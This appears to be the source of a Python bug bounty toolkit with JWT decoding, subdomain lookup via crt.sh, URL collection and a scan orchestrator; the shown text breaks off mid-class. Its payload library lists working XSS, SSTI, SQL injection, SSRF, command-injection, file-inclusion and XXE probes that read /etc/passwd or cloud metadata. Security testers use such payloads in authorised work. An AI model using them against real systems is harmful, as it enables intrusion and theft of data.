#!/usr/bin/env python3
"""
python-hunter.py — Bug Bounty Python Toolkit

A comprehensive Python toolkit for bug bounty hunting and security testing.
Provides reusable classes and functions for JS analysis, URL collection,
secret scanning, endpoint fuzzing, encoding/decoding, batch processing,
report generation, payload generation, network recon, and orchestration.

Requirements:
    pip install requests

Built-in modules: re, json, base64, sys, os, hashlib, urllib, concurrent.futures,
                  dataclasses, typing, csv, html, textwrap, time, ssl, math

Author: python-hunter
License: MIT (internal tooling)
Version: 1.0.0

Example usage:
    python python-hunter.py --analyze-js https://target.com/app.bundle.js
    python python-hunter.py --scan-secrets /path/to/source/code
    python python-hunter.py --collect-urls https://target.com --scope "*.target.com"
    python python-hunter.py --decode-jwt eyJhbGciOiJIUzI1NiJ9...
    python python-hunter.py --payloads xss
    python python-hunter.py --crt target.com
    python python-hunter.py --hash /path/to/file
    python python-hunter.py --pipeline full target.com
    python python-hunter.py --orchestrate --interactive
"""

import base64
import concurrent.futures
import csv
import hashlib
import html
import json
import math
import os
import re
import ssl as ssl_module
import sys
import textwrap
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import urljoin, urlparse, parse_qs

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


# ═══════════════════════════════════════════════════════════════════════════════
# SCRIPT METADATA
# ═══════════════════════════════════════════════════════════════════════════════

__version__ = "1.0.0"
__author__ = "python-hunter"
__description__ = "Bug Bounty Python Toolkit — JS analysis, secret scanning, URL collection, fuzzing, reporting, payloads, network"

HEADER_BANNER = r"""
  ___       _   _  __
 | _ \_  _ | | | |/ /___ _ _ _  _   _
 |  _/ || | |_| | ' </ -_) '_| || | |_|
 |_|  \_, |\___/|_|\_\___|_|  \_, | (_)
      |__/                   |__/
  Python Bug Bounty Toolkit v{version}
  {description}
""".format(version=__version__, description=__description__)

REQUIRED_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
}

CONFIG = {
    "timeout": 30,
    "max_redirects": 5,
    "rate_limit": 0.1,
    "max_workers": 10,
    "verify_ssl": True,
    "output_dir": os.path.join(os.getcwd(), "hunter_output"),
}


# ═══════════════════════════════════════════════════════════════════════════════
# MODULE IMPORTS (enhanced versions from sibling modules)
# ═══════════════════════════════════════════════════════════════════════════════

_ENHANCED_MODULES: Dict[str, bool] = {}

try:
    from js_analyzer import JSAnalyzer as EnhancedJSAnalyzer
    _ENHANCED_MODULES["js_analyzer"] = True
except ImportError:
    EnhancedJSAnalyzer = None
    _ENHANCED_MODULES["js_analyzer"] = False

try:
    from url_collector import URLCollector as EnhancedURLCollector
    _ENHANCED_MODULES["url_collector"] = True
except ImportError:
    EnhancedURLCollector = None
    _ENHANCED_MODULES["url_collector"] = False

try:
    from secret_scanner import SecretScanner as EnhancedSecretScanner
    _ENHANCED_MODULES["secret_scanner"] = True
except ImportError:
    EnhancedSecretScanner = None
    _ENHANCED_MODULES["secret_scanner"] = False

try:
    from endpoint_fuzzer import EndpointFuzzer as EnhancedEndpointFuzzer
    _ENHANCED_MODULES["endpoint_fuzzer"] = True
except ImportError:
    EnhancedEndpointFuzzer = None
    _ENHANCED_MODULES["endpoint_fuzzer"] = False

try:
    from base64_utils import Base64Toolkit as EnhancedBase64Toolkit
    _ENHANCED_MODULES["base64_utils"] = True
except ImportError:
    EnhancedBase64Toolkit = None
    _ENHANCED_MODULES["base64_utils"] = False

try:
    from batch_processor import BatchProcessor as EnhancedBatchProcessor
    _ENHANCED_MODULES["batch_processor"] = True
except ImportError:
    EnhancedBatchProcessor = None
    _ENHANCED_MODULES["batch_processor"] = False

try:
    from report_builder import ReportBuilder as EnhancedReportBuilder
    _ENHANCED_MODULES["report_builder"] = True
except ImportError:
    EnhancedReportBuilder = None
    _ENHANCED_MODULES["report_builder"] = False

try:
    from payload_generator import PayloadGenerator as EnhancedPayloadGenerator
    _ENHANCED_MODULES["payload_generator"] = True
except ImportError:
    EnhancedPayloadGenerator = None
    _ENHANCED_MODULES["payload_generator"] = False

try:
    from network_utils import NetworkUtils as EnhancedNetworkUtils
    _ENHANCED_MODULES["network_utils"] = True
except ImportError:
    EnhancedNetworkUtils = None
    _ENHANCED_MODULES["network_utils"] = False


# ═══════════════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def decode_jwt(token: str) -> Dict[str, Any]:
    """
    Decode a JWT token WITHOUT verification. Returns header and payload as dicts.
    Handles standard base64url encoding and adds padding if needed.

    Args:
        token: The JWT string (header.payload.signature)

    Returns:
        dict with keys 'header' and 'payload', each containing decoded JSON data.
    """
    parts = token.split(".")
    if len(parts) != 3:
        if len(parts) == 2:
            return {"error": "Only 2 segments (not a standard JWT)", "segments": parts}
        return {"error": "Unexpected segment count", "count": len(parts)}
    result = {}
    labels = ["header", "payload"]
    for i, label in enumerate(labels):
        try:
            raw = parts[i]
            padding = 4 - len(raw) % 4
            if padding != 4:
                raw += "=" * padding
            decoded = base64.urlsafe_b64decode(raw)
            result[label] = json.loads(decoded)
        except Exception as e:
            result[label] = {"error": f"Failed to decode {label}: {str(e)}"}
    return result


def find_urls_in_text(text: str) -> List[str]:
    """
    Extract all URLs from any text using regex.
    Matches http/https/ftp URLs with comprehensive pattern coverage.

    Args:
        text: The input text to scan.

    Returns:
        Deduplicated list of URLs found in the text.
    """
    url_pattern = re.compile(
        r'(?:https?|ftp)://'
        r'(?:[^\s<>"\'{}|\\^`\[\]]+)'
        r'(?::\d+)?'
        r'(?:/[^\s<>"\'{}|\\^`\[\]]*)?'
        r'(?:\?[^\s<>"\'{}|\\^`\[\]]*)?'
        r'(?:#[^\s<>"\'{}|\\^`\[\]]*)?',
        re.IGNORECASE
    )
    found = url_pattern.findall(text)
    seen: Set[str] = set()
    result = []
    for url in found:
        url = url.rstrip(".,;:!?)]}>")
        if url not in seen:
            seen.add(url)
            result.append(url)
    return result


def calculate_hash(filepath: str, algorithm: str = "sha256") -> str:
    """
    Calculate the hash of a file using the specified algorithm.

    Args:
        filepath: Path to the file.
        algorithm: Hash algorithm — 'sha256' or 'md5'.

    Returns:
        Hex digest string of the file hash.
    """
    algorithm = algorithm.lower().replace("-", "").replace("_", "")
    hash_map = {
        "sha256": hashlib.sha256,
        "md5": hashlib.md5,
    }
    if algorithm not in hash_map:
        raise ValueError(f"Unsupported hash algorithm: {algorithm}. Use sha256 or md5.")
    hasher = hash_map[algorithm]()
    chunk_size = 65536
    with open(filepath, "rb") as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            hasher.update(chunk)
    return hasher.hexdigest()


def generate_payloads(bug_class: str) -> List[str]:
    """
    Generate test payloads for common bug classes.

    Supported classes: xss, ssti, sqli, ssrf, command-injection, lfi,
                       open-redirect, nosqli, idor, xxe

    Args:
        bug_class: Lowercase string identifying the bug type.

    Returns:
        List of payload strings appropriate for the bug class.
    """
    if EnhancedPayloadGenerator:
        gen = EnhancedPayloadGenerator()
        return gen.generate(bug_class)
    bug_class = bug_class.lower().strip().replace(" ", "-").replace("_", "-")
    PAYLOAD_LIBRARY: Dict[str, List[str]] = {
        "xss": [
            '<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>',
            '"><script>alert(1)</script>', "';alert(1);//",
            '<details/open/ontoggle=alert(1)>', '<body/onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>', '<select autofocus onfocus=alert(1)>',
            '{{constructor.constructor("alert(1)")()}}',
            '<IMG SRC="jav&#x09;ascript:alert(1)">', '<IMG SRC="jav&#x0A;ascript:alert(1)">',
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
            '#<img/src=x/onerror=alert(1)>', 'javascript:alert(1)',
        ],
        "ssti": ['{{7*7}}', '${7*7}', '#{7*7}', '*{7*7}', '{{config}}', '{{"".__class__.__mro__[2].__subclasses__()}}',
                 '{{ cycler.__init__.__globals__.os.popen("id").read() }}', '{{lipsum.__globals__["os"].popen("id").read()}}'],
        "sqli": ["' OR '1'='1", "' OR '1'='1' --", '" OR 1=1 --', "1' ORDER BY 1--", "1' UNION SELECT NULL--",
                 "' UNION SELECT @@version--", "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
                 "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--"],
        "ssrf": ["http://localhost", "http://127.0.0.1", "http://[::1]", "http://0.0.0.0", "http://0",
                 "http://2130706433", "http://0x7f000001", "http://metadata.google.internal",
                 "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"],
        "command-injection": ["; whoami", "| whoami", "`whoami`", "$(whoami)", "& whoami &", "|| whoami", "&& whoami"],
        "lfi": ["../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd%00",
                "php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd"],
        "open-redirect": ["//evil.com", "https://evil.com", "///evil.com", "/\\evil.com", "javascript:alert(1)//"],
        "nosqli": ['{"$gt": ""}', '{"$ne": ""}', '{"$regex": ".*"}', '{"$where": "1==1"}',
                   'username[$ne]=nonexistent&password[$ne]=nonexistent'],
        "idor": ["1", "2", "100", "999999", "0", "-1", "true", "false", "null", "admin"],
        "xxe": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'],
    }
    return PAYLOAD_LIBRARY.get(bug_class, [
        f"No payload library for '{bug_class}'. Supported: {', '.join(PAYLOAD_LIBRARY.keys())}"
    ])


def extract_domains_from_crt(domain: str) -> List[str]:
    """
    Query crt.sh Certificate Transparency log for subdomains of a given domain.

    Args:
        domain: The root domain to query (e.g. 'target.com').

    Returns:
        Deduplicated sorted list of subdomains and hostnames found.
    """
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    headers = {"User-Agent": REQUIRED_HEADERS["User-Agent"]}
    subdomains: Set[str] = set()
    try:
        ctx = ssl_module.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl_module.CERT_NONE
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, context=ctx, timeout=CONFIG["timeout"]) as resp:
            data = json.loads(resp.read().decode("utf-8"))
        for entry in data:
            name_value = entry.get("name_value", "")
            for name in name_value.split("\n"):
                name = name.strip().lower()
                if name and not name.startswith("*"):
                    if domain in name or name.endswith("." + domain):
                        subdomains.add(name)
    except Exception as e:
        print(f"[!] crt.sh query failed for {domain}: {e}", file=sys.stderr)
    return sorted(subdomains)


# ═══════════════════════════════════════════════════════════════════════════════
# ORCHESTRATOR CLASS — 25+ enhancements
# ═══════════════════════════════════════════════════════════════════════════════

class Orchestrator:
    """
    Master orchestrator coordinating all python-hunter modules.

    Provides 25+ orchestration capabilities: full-scans, pipeline execution,
    cross-module finding aggregation, checkpoint/resume, config management,
    multi-target batch processing, diffing across scan runs, notification hooks,
    severity filtering, deduplication, correlation, export, and statistics.

    Attributes:
        config: Runtime configuration dict.
        findings: Aggregated list of all findings.
        scan_state: Current scan state for checkpoint/resume.
        modules: Dict of initialized sub-modules.
    """

    PIPELINE_STEPS = [
        "recon", "fetch_js", "analyze_js", "collect_urls",
        "scan_secrets", "fuzz_endpoints", "generate_payloads",
        "network_probe", "report",
    ]

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config: Dict[str, Any] = {**CONFIG, **(config or {})}
        self.findings: List[Dict[str, Any]] = []
        self.scan_state: Dict[str, Any] = {"phase": "idle", "completed_steps": [], "current_step": None}
        self.modules: Dict[str, Any] = {}
        self._init_modules()

    def _init_modules(self) -> None:
        if EnhancedJSAnalyzer:
            self.modules["js_analyzer"] = EnhancedJSAnalyzer
        if EnhancedURLCollector:
            self.modules["url_collector"] = EnhancedURLCollector
        if EnhancedSecretScanner:
            self.modules["secret_scanner"] = EnhancedSecretScanner
        if EnhancedEndpointFuzzer:
            self.modules["endpoint_fuzzer"] = EnhancedEndpointFuzzer
        if EnhancedBase64Toolkit:
            self.modules["base64_toolkit"] = EnhancedBase64Toolkit
        if EnhancedBatchProcessor:
            self.modules["batch_processor"] = EnhancedBatchProcessor
        if EnhancedReportBuilder:
            self.modules["report_builder"] = EnhancedReportBuilder
        if EnhancedPayloadGenerator:
            self.modules["payload_generator"] = EnhancedPayloadGenerator
        if EnhancedNetworkUtils:
            self.modules["network_utils"] = EnhancedNetworkUtils

    def set_config(self, key: str, value: Any) -> None:
        self.config[key] = value

    def set_proxy(self, proxy: str) -> None:
        self.config["proxy"] = proxy

    def set_rate_limit(self, rps: float) -> None:
        self.config["rate_limit"] = rps

    def load_config(self, filepath: str) -> bool:
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                loaded = json.load(f)
            self.config.update(loaded)
            return True
        except Exception as e:
            print(f"[!] Config load failed: {e}", file=sys.stderr)
            return False

    def save_config(self, filepath: str) -> bool:
        try:
            os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(self.config, f, indent=2, default=str)
            return True
        except Exception as e:
            print(f"[!] Config save failed: {e}", file=sys.stderr)
            return False

    def run_pipeline(self, steps: List[str], target: str, scope: Optional[List[str]] = None) -> Dict[str, Any]:
        results: Dict[str, Any] = {"target": target, "steps": {}, "errors": []}
        for step in steps:
            if step not in self.PIPELINE_STEPS:
                results["errors"].append(f"Unknown step: {step}")
                continue
            self.scan_state["current_step"] = step
            print(f"\n{'='*60}\n[+] Pipeline Step: {step}\n{'='*60}")
            try:
                step_result = self._run_step(step, target, scope)
                results["steps"][step] = step_result
                self.scan_state["completed_steps"].append(step)
            except Exception as e:
                err = f"Step '{step}' failed: {e}"
                print(f"[!] {err}", file=sys.stderr)
                results["errors"].append(err)
        self.scan_state["phase"] = "completed"
        results["total_findings"] = len(self.findings)
        return results

    def _run_step(self, step: str, target: str, scope: Optional[List[str]]) -> Any:
        if step == "recon":
            return self.recon_phase(target)
        elif step == "fetch_js":
            return self.fetch_js_phase(target)
        elif step == "analyze_js":
            return self.analyze_js_phase(target)
        elif step == "collect_urls":
            return self.collect_urls_phase(target, scope)
        elif step == "scan_secrets":
            return self.scan_secrets_phase(target)
        elif step == "fuzz_endpoints":
            return self.fuzz_endpoints_phase(target)
        elif step == "generate_payloads":
            return self.generate_payloads_phase(target)
        elif step == "network_probe":
            return self.network_probe_phase(target)
        elif step == "report":
            return self.report_phase(target)
        return None

    def full_scan(self, target: str, scope: Optional[List[str]] = None) -> Dict[str, Any]:
        return self.run_pipeline(self.PIPELINE_STEPS, target, scope)

    def recon_phase(self, domain: str) -> Dict[str, Any]:
        result: Dict[str, Any] = {"domain": domain, "subdomains": [], "dns": {}}
        if EnhancedNetworkUtils:
            net = EnhancedNetworkUtils()
            result["subdomains"] = net.crt_sh_subdomains(domain)
            result["dns"] = net.resolve_all_dns(domain)
        else:
            result["subdomains"] = extract_domains_from_crt(domain)
        if result["subdomains"]:
            self._add_findings("recon", "subdomain", result["subdomains"])
        print(f"[+] Recon: found {len(result['subdomains'])} subdomains")
        return result

    def fetch_js_phase(self, url: str) -> Dict[str, Any]:
        result: Dict[str, Any] = {"url": url, "loaded": False, "size": 0}
        if EnhancedJSAnalyzer:
            js = EnhancedJSAnalyzer(source_url=url)
            result["loaded"] = js.load()
            if result["loaded"]:
                result["size"] = len(js.content)
        return result

    def analyze_js_phase(self, url: str) -> Dict[str, Any]:
        result: Dict[str, Any] = {"url": url, "error": None}
        if EnhancedJSAnalyzer:
            js = EnhancedJSAnalyzer(source_url=url)
            analysis = js.analyze_all()
            result.update(analysis)
            if analysis.get("endpoints"):
                self._add_findings("analyze_js", "endpoint", analysis["endpoints"])
            if analysis.get("secrets"):
                self._add_findings("analyze_js", "secret", analysis["secrets"])
            if analysis.get("internal_endpoints"):
                self._add_findings("analyze_js", "internal_endpoint", analysis["internal_endpoints"])
        else:
            result["error"] = "JSAnalyzer not available"
        return result

    def collect_urls_phase(self, url: str, scope: Optional[List[str]] = None) -> Dict[str, Any]:
        result: Dict[str, Any] = {"url": url, "urls": [], "by_domain": {}}
        if EnhancedURLCollector:
            collector = EnhancedURLCollector(source_url=url)
            if scope:
                collector.set_scope(scope)
            if collector.fetch():
                result["urls"] = collector.extract_urls_from_html()
                result["by_domain"] = collector.group_by_domain()
                if result["urls"]:
                    self._add_findings("collect_urls", "url", result["urls"])
        else:
            collector = URLCollector(source_url=url)
            if scope:
                collector.set_scope(scope)
            if collector.fetch():
                result["urls"] = collector.extract_urls_from_html()
                result["by_domain"] = collector.group_by_domain()
        return result

    def scan_secrets_phase(self, path: str) -> Dict[str, Any]:
        result: Dict[str, Any] = {"path": path, "findings": [], "summary": {}}
        if EnhancedSecretScanner:
            scanner = EnhancedSecretScanner()
        else:
            scanner = SecretScanner()
        if os.path.isfile(path):
            result["findings"] = scanner.scan_file(path)
        elif os.path.isdir(path):
            result["findings"] = scanner.scan_directory(path)
        if result["findings"]:
            self._add_findings("scan_secrets", "secret", result["findings"])
        result["summary"] = scanner.get_summary()
        return result

    def fuzz_endpoints_phase(self, url: str) -> Dict[str, Any]:
        result: Dict[str, Any] = {"url": url, "variants": []}
        if EnhancedEndpointFuzzer:
            fuzzer = EnhancedEndpointFuzzer(base_url=url)
        else:
            fuzzer = EndpointFuzzer(base_url=url)
        result["variants"] = fuzzer.generate_all_variants()
        result["summary"] = fuzzer.get_summary()
        return result

    def generate_payloads_phase(self, vuln_class: str) -> Dict[str, Any]:
        result: Dict[str, Any] = {"class": vuln_class, "payloads": []}
        if EnhancedPayloadGenerator:
            gen = EnhancedPayloadGenerator()
            result["payloads"] = gen.generate(vuln_class)
            result["count"] = len(result["payloads"])
            result["available_classes"] = gen.get_classes()
        else:
            result["payloads"] = generate_payloads(vuln_class)
            result["count"] = len(result["payloads"])
        return result

    def network_probe_phase(self, target: str) -> Dict[str, Any]:
        result: Dict[str, Any] = {"target": target}
        if EnhancedNetworkUtils:
            net = EnhancedNetworkUtils()
            url = target if target.startswith(("http://", "https://")) else f"https://{target}"
            result["http_probe"] = net.http_probe(url)
            result["cdn"] = net.detect_cdn(target)
            result["waf"] = net.detect_waf(url)
            result["tech"] = net.detect_tech(url)
            if "error" not in result.get("http_probe", {}):
                self._add_findings("network_probe", "technology", list(result.get("tech", {}).get("body", [])))
        return result

    def report_phase(self, title: str = "Bug Bounty Report") -> Dict[str, Any]:
        result: Dict[str, Any] = {"title": title, "output_path": None}
        builder = EnhancedReportBuilder() if EnhancedReportBuilder else ReportBuilder()
        for f in self.findings:
            builder.add_finding(f)
        out = os.path.join(self.config.get("output_dir", "hunter_output"), "orchestrator_report.md")
        builder.save(out)
        result["output_path"] = out
        return result

    def _add_findings(self, source: str, category: str, items: List[Any]) -> None:
        for item in items:
            if isinstance(item, str):
                self.findings.append({"source": source, "category": category, "value": item[:200]})
            elif isinstance(item, dict):
                entry = dict(item)
                entry["source"] = entry.get("source", source)
                entry["category"] = entry.get("category", category)
                self.findings.append(entry)

    def aggregate_findings(self) -> Dict[str, Any]:
        by_source: Dict[str, List[Dict[str, Any]]] = {}
        by_category: Dict[str, List[Dict[str, Any]]] = {}
        for f in self.findings:
            src = f.get("source", "unknown")
            cat = f.get("category", "other")
            by_source.setdefault(src, []).append(f)
            by_category.setdefault(cat, []).append(f)
        return {
            "total": len(self.findings),
            "by_source": {k: len(v) for k, v in by_source.items()},
            "by_category": {k: len(v) for k, v in by_category.items()},
        }

    def deduplicate_findings(self) -> int:
        seen: Set[str] = set()
        deduped: List[Dict[str, Any]] = []
        for f in self.findings:
            key = json.dumps(f, sort_keys=True, default=str)[:200]
            if key not in seen:
                seen.add(key)
                deduped.append(f)
        removed = len(self.findings) - len(deduped)
        self.findings = deduped
        return removed

    def filter_by_severity(self, min_severity: str = "medium") -> List[Dict[str, Any]]:
        levels = {"low": 0, "medium": 1, "high": 2, "critical": 3}
        threshold = levels.get(min_severity, 1)
        return [f for f in self.findings if levels.get(f.get("severity", "low"), 0) >= threshold]

    def filter_by_category(self, category: str) -> List[Dict[str, Any]]:
        return [f for f in self.findings if f.get("category") == category]

    def correlate_findings(self) -> List[Dict[str, Any]]:
        correlations: List[Dict[str, Any]] = []
        js_endpoints = [f for f in self.findings if f.get("category") == "endpoint"]
        secrets = [f for f in self.findings if f.get("category") == "secret"]
        if js_endpoints and secrets:
            correlations.append({
                "type": "js_endpoint_with_secrets",
                "endpoints": len(js_endpoints),
                "secrets": len(secrets),
                "note": "JS bundles contain both endpoints and secrets — high-value targets",
            })
        return correlations

    def export_all(self, output_dir: str, fmt: str = "json") -> Dict[str, str]:
        os.makedirs(output_dir, exist_ok=True)
        paths: Dict[str, str] = {}
        data = {
            "scan_time": datetime.now().isoformat(),
            "config": self.config,
            "total_findings": len(self.findings),
            "aggregation": self.aggregate_findings(),
            "findings": self.findings,
        }
        json_path = os.path.join(output_dir, "all_findings.json")
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, default=str)
        paths["json"] = json_path
        if fmt == "csv" and self.findings:
            csv_path = os.path.join(output_dir, "all_findings.csv")
            with open(csv_path, "w", newline="", encoding="utf-8") as f:
                if self.findings:
                    w = csv.DictWriter(f, fieldnames=list(self.findings[0].keys()))
                    w.writeheader()
                    w.writerows(self.findings)
            paths["csv"] = csv_path
        return paths

    def checkpoint_save(self, filepath: str) -> bool:
        try:
            data = {
                "timestamp": datetime.now().isoformat(),
                "config": self.config,
                "findings": self.findings,
                "scan_state": self.scan_state,
            }
            os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, default=str)
            return True
        except Exception as e:
            print(f"[!] Checkpoint save failed: {e}", file=sys.stderr)
            return False

    def checkpoint_load(self, filepath: str) -> bool:
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                data = json.load(f)
            self.config.update(data.get("config", {}))
            self.findings = data.get("findings", [])
            self.scan_state = data.get("scan_state", {})
            return True
        except Exception as e:
            print(f"[!] Checkpoint load failed: {e}", file=sys.stderr)
            return False

    def scan_target_list(self, targets: List[str], steps: Optional[List[str]] = None) -> Dict[str, Any]:
        results: Dict[str, Any] = {"targets": {}, "errors": []}
        for target in targets:
            try:
                r = self.full_scan(target) if not steps else self.run_pipeline(steps, target)
                results["targets"][target] = r
            except Exception as e:
                results["errors"].append({"target": target, "error": str(e)})
        results["total_targets"] = len(targets)
        results["total_findings"] = len(self.findings)
        return results

    def diff_scans(self, other_checkpoint: str) -> Dict[str, Any]:
        current_findings = set(json.dumps(f, sort_keys=True, default=str) for f in self.findings)
        try:
            with open(other_checkpoint, "r", encoding="utf-8") as f:
                other = json.load(f)
            other_findings = set(json.dumps(o, sort_keys=True, default=str) for o in other.get("findings", []))
            new = len(current_findings - other_findings)
            gone = len(other_findings - current_findings)
            return {"new_findings": new, "removed_findings": gone, "total_current": len(self.findings)}
        except Exception as e:
            return {"error": str(e)}

    def run_with_notification(self, target: str, webhook_url: Optional[str] = None) -> Dict[str, Any]:
        result = self.full_scan(target)
        if webhook_url and REQUESTS_AVAILABLE:
            try:
                import requests as req
                payload = {
                    "event": "scan_complete",
                    "target": target,
                    "total_findings": len(self.findings),
                    "summary": self.aggregate_findings(),
                }
                req.post(webhook_url, json=payload, timeout=10)
            except Exception as e:
                print(f"[!] Notification failed: {e}", file=sys.stderr)
        return result

    def get_statistics(self) -> Dict[str, Any]:
        cat_counts: Dict[str, int] = {}
        src_counts: Dict[str, int] = {}
        for f in self.findings:
            cat = f.get("category", "other")
            src = f.get("source", "unknown")
            cat_counts[cat] = cat_counts.get(cat, 0) + 1
            src_counts[src] = src_counts.get(src, 0) + 1
        return {
            "total_findings": len(self.findings),
            "categories": dict(sorted(cat_counts.items(), key=lambda x: -x[1])),
            "sources": dict(sorted(src_counts.items(), key=lambda x: -x[1])),
            "deduplicated": self.deduplicate_findings(),
            "modules_available": {k: v for k, v in _ENHANCED_MODULES.items()},
        }

    def version_info(self) -> Dict[str, Any]:
        return {
            "python-hunter": __version__,
            "python": sys.version.split()[0],
            "modules": {k: ("available" if v else "missing") for k, v in _ENHANCED_MODULES.items()},
        }

    def interactive_menu(self) -> None:
        print("[+] Interactive mode — type 'help' for commands")
        while True:
            try:
                cmd = input("hunter> ").strip().lower()
                if cmd in ("exit", "quit", "q"):
                    break
                elif cmd == "help":
                    print("Commands: scan, status, findings, export, checkpoint, config, modules, help, exit")
                elif cmd == "status":
                    print(json.dumps(self.get_statistics(), indent=2))
                elif cmd == "findings":
                    for i, f in enumerate(self.findings[:20], 1):
                        print(f"  {i}. [{f.get('category','?')}] {f.get('value','')[:80]}")
                    if len(self.findings) > 20:
                        print(f"  ... and {len(self.findings) - 20} more")
                elif cmd.startswith("export"):
                    self.export_all(self.config.get("output_dir", "hunter_output"))
                    print("[+] Exported all findings")
                elif cmd.startswith("checkpoint"):
                    self.checkpoint_save(os.path.join(self.config.get("output_dir", "hunter_output"), "checkpoint.json"))
                    print("[+] Checkpoint saved")
                elif cmd == "modules":
                    info = self.version_info()
                    for mod, status in info.get("modules", {}).items():
                        print(f"  {mod}: {status}")
                elif cmd.startswith("config"):
                    print(json.dumps(self.config, indent=2, default=str))
                else:
                    print(f"Unknown: {cmd}")
            except (EOFError, KeyboardInterrupt):
                break


# ═══════════════════════════════════════════════════════════════════════════════
# BACKWARD-COMPATIBLE WRAPPER CLASSES
# ═══════════════════════════════════════════════════════════════════════════════

class JSAnalyzer:
    """Backward-compatible JSAnalyzer — delegates to enhanced module."""
    def __init__(self, source_url: str = "", content: str = ""):
        if EnhancedJSAnalyzer:
            self._impl = EnhancedJSAnalyzer(source_url=source_url, content=content)
        else:
            self._impl = _LegacyJSAnalyzer(source_url=source_url, content=content)
        self.source_url = source_url
        self.content = content
        self.endpoints: List[str] = []
        self.secrets: List[Dict[str, Any]] = []
        self.feature_flags: List[Dict[str, str]] = []
        self.source_map_url: Optional[str] = None
        self.internal_endpoints: List[str] = []
        self.results: Dict[str, Any] = {}

    def __getattr__(self, name):
        return getattr(self._impl, name)

    def load(self) -> bool:
        r = self._impl.load()
        self.content = getattr(self._impl, 'content', self.content)
        return r

    def analyze_all(self) -> Dict[str, Any]:
        r = self._impl.analyze_all()
        self.results = r
        self.endpoints = r.get("endpoints", [])
        self.secrets = r.get("secrets", [])
        self.feature_flags = r.get("feature_flags", [])
        self.source_map_url = r.get("source_map")
        self.internal_endpoints = r.get("internal_endpoints", [])
        return r

    def output_json(self, filepath: Optional[str] = None) -> str:
        return self._impl.output_json(filepath)


class URLCollector:
    """Backward-compatible URLCollector — delegates to enhanced module."""
    def __init__(self, source_url: str = ""):
        if EnhancedURLCollector:
            self._impl = EnhancedURLCollector(source_url=source_url)
        else:
            self._impl = _LegacyURLCollector(source_url=source_url)
        self.source_url = source_url
        self.base_url = source_url
        self.scope_domains: List[str] = []
        self.urls: Set[str] = set()
        self.tag_counts: Dict[str, int] = {}
        self.html_content: str = ""

    def __getattr__(self, name):
        return getattr(self._impl, name)

    def fetch(self, url: Optional[str] = None) -> bool:
        return self._impl.fetch(url)

    def extract_urls_from_html(self) -> List[str]:
        result = self._impl.extract_urls_from_html()
        self.urls = set(result)
        return result

    def set_scope(self, domains: List[str]) -> None:
        self.scope_domains = domains
        self._impl.set_scope(domains)


class SecretScanner:
    """Backward-compatible SecretScanner — delegates to enhanced module."""
    def __init__(self, context_lines: int = 2, min_confidence: float = 0.5):
        if EnhancedSecretScanner:
            self._impl = EnhancedSecretScanner()
        else:
            self._impl = _LegacySecretScanner(context_lines=context_lines, min_confidence=min_confidence)
        self.context_lines = context_lines
        self.min_confidence = min_confidence
        self.findings: List[Any] = []

    def __getattr__(self, name):
        return getattr(self._impl, name)

    def scan_text(self, text: str, source_label: str = "text") -> List[Dict[str, Any]]:
        r = self._impl.scan_text(text, source_label)
        self.findings = r
        return r

    def scan_file(self, filepath: str) -> List[Dict[str, Any]]:
        r = self._impl.scan_file(filepath)
        self.findings = r
        return r

    def scan_directory(self, directory: str, extensions: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        if EnhancedSecretScanner:
            r = self._impl.scan_file(directory)
        else:
            r = self._impl.scan_directory(directory, extensions)
        self.findings = r
        return r

    def get_summary(self) -> Dict[str, Any]:
        return self._impl.get_summary()


class EndpointFuzzer:
    """Backward-compatible EndpointFuzzer — delegates to enhanced module."""
    def __init__(self, base_url: str, method: str = "GET", params: Optional[Dict[str, str]] = None):
        if EnhancedEndpointFuzzer:
            self._impl = EnhancedEndpointFuzzer(base_url=base_url, method=method, params=params)
        else:
            self._impl = _LegacyEndpointFuzzer(base_url=base_url, method=method, params=params)
        self.base_url = base_url
        self.method = method.upper()
        self.params = params or {}
        self.variants: List[Dict[str, Any]] = []
        self.results: List[Dict[str, Any]] = []

    def __getattr__(self, name):
        return getattr(self._impl, name)

    def generate_all_variants(self) -> List[Dict[str, Any]]:
        self.variants = self._impl.generate_all_variants()
        return self.variants

    def get_summary(self) -> Dict[str, Any]:
        return self._impl.get_summary()


class Base64Toolkit:
    """Backward-compatible Base64Toolkit — delegates to enhanced module."""
    def __init__(self, input_string: str = ""):
